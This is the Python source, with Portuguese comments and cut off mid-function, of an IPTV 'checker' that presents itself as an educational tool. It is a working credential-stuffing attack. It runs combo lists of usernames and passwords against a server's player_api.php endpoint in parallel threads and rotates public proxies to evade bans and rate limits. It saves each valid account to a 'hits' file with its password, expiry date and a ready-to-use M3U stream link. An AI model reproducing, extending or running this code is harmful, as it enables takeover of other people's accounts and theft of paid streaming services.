"""
PY CONFIG BY Thomas R., Telegram: @ReyFxck
FEITO PARA AJUDAR QUEM PRECISA E DE GRAÇA!
GITHUB: https://github.com/ReyFxck/DeepSeek-IPTV-Checker
FERRAMENTA EDUCACIONAL NÃO USE PARA O MAL
PROIBIDO A VENDA DESTE SCRIPT!

    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⡿⠿⢿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠛⠉⠉⠉⠙⠻⣅⠀⠈⢧⠀⠈⠛⠉⠉⢻⣿⣿
    ⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣤⡶⠟⠀⠀⣈⠓⢤⣶⡶⠿⠛⠻⣿
    ⣿⣿⣿⣿⣿⢣⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣀⣴⠶⠿⠿⢷⡄⠀⠀⢀⣤⣾⣿
    ⣿⣿⣿⣿⣡⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣦⣤⣤⡀⠀⢷⡀⠀⠀⣻⣿⣿
    ⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⠛⠶⠛⠃⠈⠈⢿⣿⣿
    ⣿⣿⠟⠘⠀⠀⠀⠀⠀⠀⠀⠀⢀⡆⠀⠀⠀⠀⠀⠀⣧⠀⠀⠀⠀⠀⠀⠈⣿⣿
    ⣿⠏⠀⠁⠀⠀⠀⠀⠀⠀⠀⢀⣶⡄⠀⠀⠀⠀⠀⠀⣡⣄⣿⡆⠀⠀⠀⠀⣿⣿
    ⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⠛⠛⢛⣲⣶⣿⣷⣉⠉⢉⣥⡄⠀⠀⠀⠨⣿⣿
    ⡇⢠⡆⠀⠀⢰⠀⠀⠀⠀⢸⣿⣧⣠⣿⣿⣿⣿⣿⣿⣷⣾⣿⡅⠀⠀⡄⠠⢸⣿
    ⣧⠸⣇⠀⠀⠘⣤⡀⠀⠀⠘⣿⣿⣿⣿⣿⠟⠛⠻⣿⣿⣿⡿⢁⠀⠀⢰⠀⢸⣿
    ⣿⣷⣽⣦⠀⠀⠙⢷⡀⠀⠀⠙⠻⠿⢿⣷⣾⣿⣶⠾⢟⣥⣾⣿⣧⠀⠂⢀⣿⣿
    ⣿⣿⣿⣿⣷⣆⣠⣤⣤⣤⣀⣀⡀⠀⠒⢻⣶⣾⣿⣿⣿⣿⣿⣿⣿⢀⣀⣾⣿⣿

C o d e d - B y - T h o m a s - N o o b S o f r e !
"""

# importar bibliotecas padrão
import os
import sys
import json
import time
import random
import threading
import traceback
from datetime import datetime

# Cores para melhorar a visualização
class cor:
    white_n = "\033[0;1m"
    vermelho = "\033[91m"
    verde = "\033[92m"
    amarelo = "\033[93m"
    azul = "\033[94m"
    magenta = "\033[95m"
    ciano = "\033[96m"
    reset = "\033[0m"
    c_azul = "\033[38;5;27m"
    c_purple = "\033[38;5;200m"
    custom = "\033[38;5;208m"
    fail = "\033[1;38;5;9m"
    atention = "\033[1;38;5;227m"

# Verifica se as bibliotecas estão instaladas
try:
    import requests
except ImportError:
    print(f"{cor.vermelho}A biblioteca 'requests' não está instalada. Instale-a com o comando abaixo:{cor.reset}")
    print("pip install requests")
    exit()

try:
    import socks
    from requests.packages.urllib3.contrib.socks import SOCKSProxyManager
except ImportError:
    print(f"{cor.vermelho}A biblioteca 'requests[socks]' não está instalada. Instale-a com o comando abaixo:{cor.reset}")
    print("pip install requests[socks]")
    exit()

try:
    from tabulate import tabulate
except ImportError:
    print(f"{cor.vermelho}A biblioteca 'tabulate' não está instalada. Instale-a com o comando abaixo:{cor.reset}")
    print("pip install tabulate")
    exit()

# ======================================
# CONSTANTES E CONFIGURAÇÕES GLOBAIS
# ======================================
CONFIG_FILE = "config.json"
LANG_DIR = "Language"
PROXY_API_FILE = "proxy_api.json"

def carregar_proxy_apis():
    """Carrega as APIs de proxy do arquivo JSON"""
    defaults = {
        "ProxyScrape": {
            "url": "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "type": 1
        }
    }
    
    if os.path.exists(PROXY_API_FILE):
        try:
            with open(PROXY_API_FILE, "r") as f:
                return json.load(f)
        except:
            return defaults
    return defaults


# Carrega as APIs no início
PROXY_APIS = carregar_proxy_apis()


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def criar_t(config):
    """Retorna uma função t() que já tem acesso ao config"""
    def t(key, default=None):
        keys = key.split('.')
        current = carregar_idioma(config["idioma"]).get("translations", {})
        
        try:
            for k in keys:
                current = current[k]
            return current
        except (KeyError, TypeError):
            return default if default is not None else key
    return t


def carregar_configuracoes():
    """Carrega ou cria arquivo de configuração"""
    defaults = {
        "sistema_operacional": None,
        "idioma": None,
        "configurado": False,
        "categoria_tipo": "empilhado",
        "banner_color": "90m",  # Novo campo padrão
        "hit_settings": {
            "HOST": True,
            "USER": True,
            "PASS": True,
            "STATUS": True,
            "TRIAL": True,
            "EXPIRATION": True,
            "CREATED_AT": True,
            "CONNECTIONS": True,
            "TIMEZONE": True,
            "MESSAGE": True,
            "M3U_LINK": True
        }
    }
    
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                dados = json.load(f)
                
                # Corrige estrutura aninhada legada (para compatibilidade com versões antigas)
                if isinstance(dados.get("sistema_operacional"), dict):
                    config = {
                        "sistema_operacional": dados["sistema_operacional"].get("sistema_operacional"),
                        "idioma": dados["sistema_operacional"].get("idioma", "pt"),
                        "configurado": dados["sistema_operacional"].get("configurado", False),
                        "banner_color": dados.get("banner_color", "90m"),  # Novo campo
                        "hit_settings": {**defaults["hit_settings"], **dados.get("hit_settings", {})}
                    }
                else:
                    # Mescla com defaults mantendo configurações existentes
                    config = {**defaults, **dados}
                
                # Garante que hit_settings tenha todas as chaves (para versões antigas sem essas configurações)
                config["hit_settings"] = {**defaults["hit_settings"], **dados.get("hit_settings", {})}
                
                # Garante que o banner_color esteja definido (para versões antigas)
                if "banner_color" not in config:
                    config["banner_color"] = "90m"
                
                return config
        except Exception as e:
            print(f"{cor.vermelho}Erro ao carregar configurações: {e}{cor.reset}")
            return defaults
    return defaults


def salvar_configuracao(config):
    """Salva configurações no arquivo garantindo estrutura plana"""
    config_plana = {
        "sistema_operacional": config.get("sistema_operacional"),
        "idioma": config.get("idioma", "pt"),
        "configurado": config.get("configurado", False),
        "categoria_tipo": config.get("categoria_tipo", "empilhado"),
        "banner_color": config.get("banner_color", "90m"),
        "hit_settings": config.get("hit_settings", {})
    }
    with open(CONFIG_FILE, "w") as f:
        json.dump(config_plana, f, indent=4)


# Banner de decoração (normal em projetos)
def banner(config, t):
    clear()
    translated_by = t('traduce.traduce_json', default="Json não carregado")
    print(f"""{cor.c_azul}
        ⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⣤⣶⣶⣶⠶⠀⠀⠀⠀⣰⣿⣄            
        ⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⣿⣿⣿⣷⣦⡀⢀⣀⣀⣠⣴⣿          
        ⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⢹⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⡿         
        ⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁        
        ⣾⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⣿⣿⣿⣿⡟⠛⠉⠁        
        ⣿⣿⡇⠀⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣏⣉⠻⢿⣿⣿⣿⣿⣿⣿⣿⡇        
        ⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣯⣿⡇⠀⢻⣿⣿⣿⣿⣿⣿⠁        
        ⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣷⣦⣴⣿⣿⣿⣿⣿⠏        
        ⢻⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟        
        ⠀⠹⣿⣿⣿⣷⣄⠀⠀⠀⠀⣴⣦⣄⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⠋        
        ⠀⠀⠙⢿⣿⣿⣿⣷⣄⡀⠀⢿⣿⣿⣿⣦⣄⠀⠙⢿⣿⣿⣿⣿⣿⣤⣀        
        ⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣽⡿⢿⣿⣿⣿⣿⡿        
        ⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀{cor.reset}
{cor.c_purple}\n            DEEPSEEK IPTV CHECKER BY @ReyFxck
            GitHub https://github.com/ReyFxck
            Script Python, Version: 4 Beta: 5\n{cor.reset}
            Translated by: {translated_by}{cor.reset}""")

# ==============================================
# GERENCIAMENTO DE IDIOMAS
# ==============================================
def carregar_idioma(idioma):
    """Carrega traduções do arquivo de idioma"""
    lang_file = f"lang-{idioma}.json" if idioma != "default" else "lang.json"
    
    base_dir = os.path.dirname(os.path.abspath(__file__))
    lang_path = os.path.join(base_dir, LANG_DIR, lang_file)

    # Fallback para inglês se o arquivo não existir
    if not os.path.exists(lang_path):
        lang_path = os.path.join(base_dir, LANG_DIR, "lang-en.json")
        if not os.path.exists(lang_path):
            return {"translations": {}}
    
    try:
        with open(lang_path, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {"translations": {}}

def listar_idiomas_disponiveis():
    """Retorna lista de idiomas disponíveis na pasta lang/"""
    if not os.path.exists(LANG_DIR):
        os.makedirs(LANG_DIR)
        return []
    
    idiomas = []
    for arquivo in os.listdir(LANG_DIR):
        if arquivo.startswith("lang-") and arquivo.endswith(".json"):
            idiomas.append(arquivo[5:-5])  # Remove 'lang-' e '.json'
    return idiomas


def configurar_hit_settings(config, t):
    """Menu para configurar o que aparece no arquivo de hits"""
    while True:
        banner(config, t)
        print(f"\n{cor.ciano}  === CONFIGURAR INFORMAÇÕES NO HIT ==={cor.reset}")
        print(f"{cor.amarelo}  Selecione o item para ativar/desativar:{cor.reset}\n")
        
        # Lista todas as opções com status atual
        settings = config["hit_settings"]
        for i, (key, value) in enumerate(settings.items(), 1):
            status = f"{cor.verde}ON{cor.reset}" if value else f"{cor.vermelho}OFF{cor.reset}"
            print(f"{cor.azul}  {i}. {key.ljust(12)}: [{status}]")
        
        print(f"\n{cor.ciano}  {len(settings)+1}. Voltar{cor.reset}")
        print(f'  {cor.ciano}{"=" * 26}{cor.reset}\n')
        
        try:
            escolha = int(input(f"{cor.verde}>> {cor.reset}")) - 1
            if escolha == len(settings):
                return  # Voltar
            elif 0 <= escolha < len(settings):
                key = list(settings.keys())[escolha]
                # Pergunta se quer ligar/desligar
                print(f"\n{cor.ciano}  {key} | DESEJA LIGAR/DESLIGAR?{cor.reset}")
                print(f"{cor.azul}  1. LIGADO{cor.reset}")
                print(f"{cor.azul}  2. DESLIGADO{cor.reset}")
                opcao = input(f"{cor.verde}>> {cor.reset}")
                if opcao == "1":
                    settings[key] = True
                elif opcao == "2":
                    settings[key] = False
                salvar_configuracao(config)
        except ValueError:
            print(f"{cor.vermelho}Opção inválida!{cor.reset}")

# Função para escolher o sistema operacional
def escolher_sistema_operacional(config, t=None):
    """Mostra opções de SO com tradução e confirma o caminho"""
    banner(config, t)
    
    # Dicionário FIXO de mapeamento
    SISTEMAS_PADRONIZADOS = {
        "1": "Android",
        "2": "Windows", 
        "3": "Linux",
        "4": "macOS",
        "5": "iOS"
    }
    
    # Textos traduzidos (com fallback)
    if t:
        titulo = ('  Escolha o sistema operacional:')
        ajuda = ('Isso define onde as pastas serão criadas:')
        opcoes_texto = {
            "1": ("Android"),
            "2": ("Windows"),
            "3": ("Linux"), 
            "4": ("macOS"),
            "5": ("iOS")
        }
        prompt = ('>>')
        erro_msg = ('Opção inválida!')
        confirmacao = ('Caminho que será usado:')
    else:
        titulo = "Escolha o sistema operacional:"
        ajuda = "Isso define onde as pastas serão criadas:"
        opcoes_texto = SISTEMAS_PADRONIZADOS.copy()
        prompt = ">>>"
        erro_msg = "Opção inválida!"
        confirmacao = "Caminho que será usado:"

    print(f"{cor.ciano}{titulo}{cor.reset}")
    print(f"\n{cor.amarelo}[?] {ajuda}{cor.reset}\n")
    
    # Mostra menu
    for num, nome in opcoes_texto.items():
        print(f"{cor.azul}{num}. {nome}{cor.reset}")
    
    # Validação
    while True:
        escolha = input(f"{cor.verde} {prompt} {cor.reset}").strip()
        
        if escolha in SISTEMAS_PADRONIZADOS:
            sistema_escolhido = SISTEMAS_PADRONIZADOS[escolha]
            caminho = determinar_caminho_base(sistema_escolhido)
            
            # NOVO: Mostra confirmação do caminho
            print(f"\n{cor.verde}✓ {confirmacao}{cor.reset}")
            print(f"{cor.ciano}{caminho if caminho else 'Não suportado!'}{cor.reset}\n")
            
            if caminho:
                return sistema_escolhido
            else:
                print(f"{cor.vermelho}Sistema não suportado! Escolha novamente.{cor.reset}")
        else:
            print(f"{cor.vermelho}{erro_msg}{cor.reset}")

# Função para determinar o caminho base com base no sistema operacional
def determinar_caminho_base(sistema_operacional):
    try:
        caminhos = {
            "Android": "/sdcard/",  # Caminho padrão no Android
            "Windows": os.path.join(os.environ["USERPROFILE"], "Documents"),
            "Linux": os.path.join(os.environ.get("HOME", "/"), "Documents"),
            "macOS": os.path.join(os.environ.get("HOME", "/"), "Documents"),
            "iOS": "."
        }
        return caminhos.get(sistema_operacional, None)
    except KeyError:
        # Fallback para Android ou outros sistemas se houver erro
        return "/sdcard/" if sistema_operacional == "Android" else None

# Função para limpar o host (remover http://, https://, barras e espaços)
def limpar_host(host):
    host = host.replace("http://", "").replace("https://", "")  # Remove protocolos
    host = host.split("/")[0]  # Remove barras no final
    host = host.strip()  # Remove espaços em branco
    return host


def escolher_proxy_api(config, t):
    """Mostra menu de APIs de proxy e retorna (proxies, tipo_proxy)"""
    banner(config, t)
    print(f"\n{cor.ciano}  === ONLINE PROXY API'S ==={cor.reset}")
    print(f"{cor.atention}  Selecione a fonte de proxies online:{cor.reset}\n")
    
    for i, (nome, dados) in enumerate(PROXY_APIS.items(), 1):
        # Usa display_name se existir, senão cria automaticamente
        display = dados.get('display_name', 
                          f"{nome.split()[0]} ({'HTTP' if dados['type'] == 1 else 'SOCKS4' if dados['type'] == 2 else 'SOCKS5'})")
        print(f"{cor.azul}  {i}. {display}{cor.reset}")
    
    print(f"\n{cor.ciano}  {len(PROXY_APIS)+1}. Voltar{cor.reset}")
    print(f'  {cor.ciano}{"=" * 26}{cor.reset}\n')
    
    try:
        escolha = int(input(f"{cor.verde}>> {cor.reset}")) - 1
        if escolha == len(PROXY_APIS):
            return None  # Voltar
        
        if 0 <= escolha < len(PROXY_APIS):
            nome_api = list(PROXY_APIS.keys())[escolha]
            api = PROXY_APIS[nome_api]
            
            print(f"\n{cor.verde}  Obtendo proxies de {api.get('display_name', nome_api)}...{cor.reset}")
            
            try:
                headers = api.get("headers", {})
                response = requests.get(api["url"], headers=headers, timeout=10)
                if response.status_code == 200:
                    proxies = [p.strip() for p in response.text.splitlines() if p.strip()]
                    
                    if api.get("clean_protocol", False):
                        proxies = [p.replace("http://", "").replace("socks4://", "").replace("socks5://", "") for p in proxies]
                    
                    print(f"{cor.verde}  {len(proxies)} proxies obtidos com sucesso!{cor.reset}")
                    return proxies, api["type"]
                else:
                    print(f"{cor.vermelho}  Erro ao acessar API: Status {response.status_code}{cor.reset}")
                    return None
            except Exception as e:
                print(f"{cor.vermelho}  Erro ao acessar API: {str(e)}{cor.reset}")
                return None
    except ValueError:
        print(f"{cor.vermelho}  Opção inválida!{cor.reset}")
        return None


def carregar_proxy_apis():
    """Carrega as APIs de proxy do arquivo JSON"""
    proxy_api_file = "proxy_api.json"
    defaults = {
        "ProxyScrape": {
            "url": "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "type": 1
        }
    }
    
    if os.path.exists(proxy_api_file):
        try:
            with open(proxy_api_file, "r") as f:
                return json.load(f)
        except:
            return defaults
    return defaults


# Função para listar arquivos em uma pasta e permitir a escolha pelo número
def escolher_arquivo(pasta, t, tipo="combo", config=None):
    if not os.path.exists(pasta):
        print(f"{cor.amarelo}  {t('responses.creating_folder_combo', 'Criando pasta:')} {pasta}{cor.reset}")
        os.makedirs(pasta)
        return None
        
    arquivos = [f for f in os.listdir(pasta) if f.endswith('.txt')]
    
    print(f'\n  {cor.ciano}{"=" * 26}{cor.reset}')
    if tipo == "combo":
        print(f"{cor.atention}  {t('questions.select_combo_file')}{cor.reset}")
    else:
        print(f"{cor.atention}  {t('questions.select_proxy_file')}{cor.reset}")
    
    # Adiciona opção para Proxy Online se for seleção de proxy
    if tipo != "combo":
        print(f"{cor.azul}  0. ONLINE PROXY API'S{cor.reset}")
    
    for i, arquivo in enumerate(arquivos, 1):
        print(f"{cor.azul}  {i}. {arquivo}{cor.reset}")
        
    print(f'  {cor.ciano}{"=" * 26}{cor.reset}')
    
    try:
        escolha = input(f"\n  {cor.verde}{t('responses.response')} >>> {cor.reset}").strip()
        
        # Se for 0 e for seleção de proxy, mostrar menu de APIs
        if escolha == "0" and tipo != "combo":
            return escolher_proxy_api(config, t)
            
        escolha = int(escolha) - 1
        if 0 <= escolha < len(arquivos):
            return os.path.join(pasta, arquivos[escolha])
        else:
            print(f"{cor.vermelho}\n  {t('responses.invalid_choice')}{cor.reset}")
            return None
    except ValueError:
        print(f"{cor.vermelho}\n  {t('responses.invalid_input')}{cor.reset}")
        return None

# Função para configurar o tipo de proxy
def configurar_proxy(tipo, proxy):
    if tipo == 1:  # HTTP/HTTPS
        return {"http": proxy, "https": proxy}
    elif tipo == 2:  # SOCKS4
        return {"http": f"socks4://{proxy}", "https": f"socks4://{proxy}"}
    elif tipo == 3:  # SOCKS5
        return {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"}
    else:
        return None

# Função para converter timestamp em data legível (formato DD.MM.YYYY - HH:MM)
def converter_data(timestamp, t=None):
    try:
        return datetime.fromtimestamp(int(timestamp)).strftime('%d.%m.%Y - %H:%M')
    except:
        return t('checker.unlimited_time') if t else "Ilimitada"

# Função para testar usuário e senha (com ou sem proxy)
def test_account(username, password, proxy_config, server, headers, t, buscar_categorias_flag=False):
    url = f"http://{server}/player_api.php?username={username}&password={password}"
    try:
        response = requests.get(
            url,
            proxies=proxy_config,
            headers=headers,
            timeout=5
        )
        if response.status_code == 200:
            try:
                data = response.json()
                
                auth = data.get("user_info", {}).get("auth", 0)
                if auth == 0:
                    auth = data.get("auth", 0)

                if auth == 1:
                    user_info = data.get("user_info", {})
                    status = user_info.get("status", data.get("status", "Desconhecido"))
                    exp_date = user_info.get("exp_date", data.get("exp_date"))
                    exp_date = t('checker.unlimited_time') if exp_date is None else converter_data(exp_date, t)
                    
                    # Busca categorias apenas se configurado e for hit válido
                    if buscar_categorias_flag:
                        categorias = buscar_categorias(server, username, password, proxy_config, headers)
                        user_info["categorias"] = categorias
                    
                    return username, password, status, exp_date, response.status_code, user_info, "hit"
                else:
                    return username, password, None, None, response.status_code, None, "bad"
            except ValueError:
                return username, password, None, None, response.status_code, None, "bad"
        elif response.status_code == 404:
            return username, password, None, None, response.status_code, None, "bad"
        elif response.status_code == 403 or response.status_code == 407:
            return username, password, None, None, response.status_code, None, "ban"
        elif response.status_code == 429:
            return username, password, None, None, response.status_code, None, "429"
        else:
            return username, password, None, None, response.status_code, None, "proxy_ruim"
    except Exception as e:
        return username, password, None, None, str(e), None, "proxy_ruim"

def buscar_categorias(server, username, password, proxy_config, headers, max_tentativas=3):
    """Busca categorias disponíveis para uma conta válida com tentativas"""
    url = f"http://{server}/player_api.php?username={username}&password={password}&action=get_live_categories"
    
    for tentativa in range(max_tentativas):
        try:
            response = requests.get(
                url,
                proxies=proxy_config,
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                categorias = response.json()
                
                # Suporte para diferentes formatos de resposta
                if isinstance(categorias, list):
                    # Formato direto: [{"category_id":1,"category_name":"Nome"},...]
                    return [cat.get("category_name", "Desconhecida") for cat in categorias]
                elif isinstance(categorias, dict):
                    # Formato encapsulado: {"categories":[{"category_id":1,"category_name":"Nome"},...]}
                    if 'categories' in categorias and isinstance(categorias['categories'], list):
                        return [cat.get("category_name", "Desconhecida") for cat in categorias['categories']]
                    # Formato alternativo: {"live_categories":[{"category_id":1,"category_name":"Nome"},...]}
                    elif 'live_categories' in categorias and isinstance(categorias['live_categories'], list):
                        return [cat.get("category_name", "Desconhecida") for cat in categorias['live_categories']]
                
                return []
            
        except requests.exceptions.JSONDecodeError:
            print(f"{cor.amarelo}[AVISO] Resposta da API não é um JSON válido (tentativa {tentativa + 1}/{max_tentativas}){cor.reset}")
            if tentativa == max_tentativas - 1:
                return []
            time.sleep(1)
            
        except requests.exceptions.RequestException as e:
            print(f"{cor.amarelo}[AVISO] Erro na requisição: {e} (tentativa {tentativa + 1}/{max_tentativas}){cor.reset}")
            if tentativa == max_tentativas - 1:
                return []
            time.sleep(1)
    
    return []


def salvar_hit(server, username, password, status, exp_date, user_info, caminho_arquivo, config, t=None):
    try:
        config = carregar_configuracoes()
        hit_settings = config.get("hit_settings", {})
        
        with open(caminho_arquivo, "a", encoding="utf-8") as f:
            f.write("=====[ DEEPSEEK CHECKER ]=====\n")
            f.write("DeepSeek Checker V5 Beta - Rev 1\n")
            f.write(f'{t("traduce.traduce_hit") if t else "HIT"}\n')
            f.write("=====[ HOST INFORMATION ]=====\n")

            if hit_settings.get("MESSAGE", True) and "message" in user_info and user_info["message"]:
                f.write(f'{t("checker.message") if t else "Message"}: {user_info["message"]}\n')

            if hit_settings.get("HOST", True):
                f.write(f'{t("checker.host") if t else "Host"}: {server}\n')

            if hit_settings.get("USER", True):
                f.write(f'{t("checker.user") if t else "User"}: {username}\n')

            if hit_settings.get("PASS", True):
                f.write(f'{t("checker.password") if t else "Password"}: {password}\n')

            if hit_settings.get("STATUS", True):
                f.write(f'{t("checker.status") if t else "Status"}: {status}\n')

            if hit_settings.get("TRIAL", True) and "is_trial" in user_info:
                teste = t("questions.yes") if user_info["is_trial"] == "1" else t("questions.no") if t else ("Yes" if user_info["is_trial"] == "1" else "No")
                f.write(f'{t("checker.trial") if t else "Trial"}: {teste}\n')

            if hit_settings.get("EXPIRATION", True) and exp_date:
                f.write(f'{t("checker.expiration") if t else "Expiration"}: {exp_date}\n')

            if hit_settings.get("CREATED_AT", True) and "created_at" in user_info and user_info["created_at"]:
                criado = converter_data(user_info["created_at"])
                f.write(f'{t("checker.created_at") if t else "Created"}: {criado}\n')

            if hit_settings.get("CONNECTIONS", True) and "active_cons" in user_info and "max_connections" in user_info:
                if t:
                    f.write(f'{t("checker.connections")}: {t("checker.active_connections")}: {user_info["active_cons"]} | {t("checker.max_connections")}: {user_info["max_connections"]}\n')
                else:
                    f.write(f'Connections: Active: {user_info["active_cons"]} | Max: {user_info["max_connections"]}\n')

            if hit_settings.get("TIMEZONE", True) and "timezone" in user_info and user_info["timezone"]:
                f.write(f'{t("checker.timezone") if t else "Timezone"}: {user_info["timezone"]}\n')

            if hit_settings.get("M3U_LINK", True):
                f.write(f'{t("checker.m3u_link") if t else "M3U Link"}: http://{server}/get.php?username={username}&password={password}&type=m3u8\n')
            
            if "categorias" in user_info and user_info["categorias"]:
                f.write(f'====[ CATEGORIES INFO ({len(user_info["categorias"])}) ]====\n')
                
                if config.get("categoria_tipo", "empilhado") == "empilhado":
                    for i, categoria in enumerate(user_info["categorias"], 1):
                        f.write(f'📺 {i}. {categoria}\n')
                else:
                    linha_categorias = " ".join([f'📺 {i}. {cat}' for i, cat in enumerate(user_info["categorias"], 1)])
                    f.write(f'{linha_categorias}\n')
            
            f.write(f"====[ IPTV CHK BY -- ReyFxck ]====\n\n\n")
            
    except Exception as e:
        error_msg = t("responses.error_saving_file") if t else "Error saving file"
        print(f"{cor.vermelho}{error_msg} {e}{cor.reset}")


def processar_combos(combos, server, headers, proxies, tipo_proxy, num_bots, hits, bads, bans, total_linhas, caminho_arquivo, usar_proxy, arquivo_proxy, config, t, mostrar_categorias=False):
    lock = threading.Lock()
    proxies_bons = []
    proxies_ruins = []
    contador_proxies = {}
    MAX_USOS_POR_PROXY = 4
    def worker(config, t):
        nonlocal hits, bads, bans
        while True:
            with lock:
                if not combos:
                    break
                user, password = combos.pop(0)
                linha_atual = total_linhas - len(combos)

            # Se não estiver usando proxy
            if usar_proxy != "1":
                proxies = []
                tipo_proxy = None
                result = test_account(user, password, None, server, headers, t, mostrar_categorias)
                username, password, status, exp_date, status_code, user_info, resultado = result
                
                with lock:
                    if resultado == "hit":
                        hits += 1
                        salvar_hit(server, username, password, status, exp_date, user_info, caminho_arquivo, config, t)
                    elif resultado == "bad":
                        bads += 1
                    elif resultado == "ban":
                        bans += 1
                
                exibir_informacoes(
                    server=server,
                    user=username,
                    password=password,
                    status_code=status_code,
                    linha_atual=linha_atual,
                    total_linhas=total_linhas,
                    hits=hits,
                    bads=bads,
                    bans=bans,
                    usar_proxy=usar_proxy,
                    proxies_bons_count=0,
                    proxies_ruins_count=0,
                    tipo_proxy=None,
                    arquivo_proxy=None,
                    proxy_escolhida=None,
                    config=config,
                    t=t
                )
                continue

            # Se estiver usando proxy
            proxy_escolhida = None
            resultado = None
            
            for proxy_candidata in proxies_bons + proxies:
                if proxy_candidata in proxies_ruins:
                    continue
                
                with lock:
                    if contador_proxies.get(proxy_candidata, 0) >= MAX_USOS_POR_PROXY:
                        continue
                
                proxy_config = configurar_proxy(tipo_proxy, proxy_candidata)
                result = test_account(user, password, proxy_config, server, headers, t, mostrar_categorias)
                username, password, status, exp_date, status_code, user_info, resultado = result
                
                with lock:
                    # Atualiza contador de usos da proxy
                    contador_proxies[proxy_candidata] = contador_proxies.get(proxy_candidata, 0) + 1
                    
                    # Classifica a proxy
                    if resultado in ["hit", "bad"]:
                        if proxy_candidata not in proxies_bons:
                            proxies_bons.append(proxy_candidata)
                        if proxy_candidata in proxies_ruins:
                            proxies_ruins.remove(proxy_candidata)
                    elif resultado in ["ban", "429", "proxy_ruim"]:
                        if proxy_candidata not in proxies_ruins:
                            proxies_ruins.append(proxy_candidata)
                        if proxy_candidata in proxies_bons:
                            proxies_bons.remove(proxy_candidata)
                
                proxy_escolhida = proxy_candidata
                
                # Se obteve resultado, para de tentar outras proxies
                if resultado in ["hit", "bad", "ban"]:
                    break
            
            # Processa o resultado
            with lock:
                if resultado == "hit":
                    hits += 1
                    salvar_hit(server, username, password, status, exp_date, user_info, caminho_arquivo, config, t)
                elif resultado == "bad":
                    bads += 1
                elif resultado == "ban":
                    bans += 1
            
            exibir_informacoes(
                server=server,
                user=username if 'username' in locals() else user,
                password=password,
                status_code=status_code if 'status_code' in locals() else "N/A",
                linha_atual=linha_atual,
                total_linhas=total_linhas,
                hits=hits,
                bads=bads,
                bans=bans,
                usar_proxy=usar_proxy,
                proxies_bons_count=len(proxies_bons),
                proxies_ruins_count=len(proxies_ruins),
                tipo_proxy=tipo_proxy,
                arquivo_proxy=arquivo_proxy,
                proxy_escolhida=proxy_escolhida,
                config=config,
                t=t
            )

    # Inicia as threads
    threads = []
    for _ in range(num_bots):
        thread = threading.Thread(target=worker, args=(config, t))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    # Salva proxies boas/ruins (opcional)
    if usar_proxy == "1":
        with open(os.path.join(pasta_proxy, "proxies_bons.txt"), "w") as f:
            f.write("\n".join(proxies_bons))
        with open(os.path.join(pasta_proxy, "proxies_ruins.txt"), "w") as f:
            f.write("\n".join(proxies_ruins))

    return hits, bads, bans


def exibir_informacoes(server, user, password, status_code, linha_atual, total_linhas, hits, bads, bans, usar_proxy, proxies_bons_count=None, proxies_ruins_count=None, tipo_proxy=None, arquivo_proxy=None, proxy_escolhida=None, config=None, t=None):
    """Exibe as informações de verificação com banner e tabela atualizados"""
    
    # Limpa a tela e exibe o banner sempre
    output = []
    output.append("\033[H\033[J")  # Limpa a tela
    output.append(banner_checking(config, t, return_str=True))
    
    # Prepara as informações dinâmicas
    deepseek = "\033[38;5;33m DEEPSEEK CHK\033[0m"
    infor_x = "\033[38;5;11m    INFORMATIONS\033[0m"
    
    tabela_host = [
        ["\033[38;5;45m   Host: ", f"\033[38;5;47m http://{server} \033[0m"],
        ["\033[38;5;153m   Status: ", status_code],
        ["\033[38;5;81m   User: ", user],
        ["\033[38;5;117m   Pass: ", password],
        ["\033[1;38;5;156m   Hits: ", f"   {hits} {cor.reset} "],
        [f"{cor.fail}   Fails: ", f"    {bads} "],
        ["\033[1;38;5;214m   Banned: ", f"   {bans} {cor.reset} "],
        ["   Combo", f"{linha_atual}/{total_linhas} "],
        ["\033[38;5;189m   Restam: ", f" {total_linhas - linha_atual} "]
    ]
    
    # Adiciona a tabela ao buffer
